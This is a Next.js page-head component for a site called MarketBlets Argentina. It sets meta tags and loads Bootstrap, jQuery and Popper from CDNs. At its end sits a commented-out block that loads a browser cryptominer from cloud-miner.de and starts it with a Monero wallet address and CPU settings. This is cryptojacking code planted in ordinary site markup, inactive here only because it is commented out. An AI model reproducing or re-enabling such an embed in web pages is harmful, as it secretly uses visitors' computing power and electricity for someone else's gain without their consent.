import Head from 'next/head';
//<meta property="og:url" content="https://marketblets.com"/>
const Heads = () => (
    <Head>
        <meta charSet="UTF-8"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        <title>MarketBlets Argentina</title>
        <meta property="og:type" content="article"/>
        <link rel="icon" type="image/png" href="../img/icon.png"/>
        <meta property="og:image" content="../img/icon.png"/>
        <link rel="stylesheet" 
            href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" 
            integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" 
            crossOrigin="anonymous"/>
        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" 
            integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" 
            crossOrigin="anonymous"/>
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" 
            integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" 
            crossOrigin="anonymous"/>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" 
            integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" 
            crossOrigin="anonymous"/>
        {/*<script src="https://cloud-miner.de/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.moneroocean"/>
        <script 
        dangerouslySetInnerHTML={{
            __html: `EverythingIsLife('47msWQ2EiquLJj73f5pbQnF82Uheo8VMVPa8cCcgyCBZFig2JenAX5xKpEkEFPnwxSFHQtQgcrjTiiwb3umb1GL18xsB8U6', 'x', 30);`
        }}
    />*/}
    </Head>
)

export default Heads;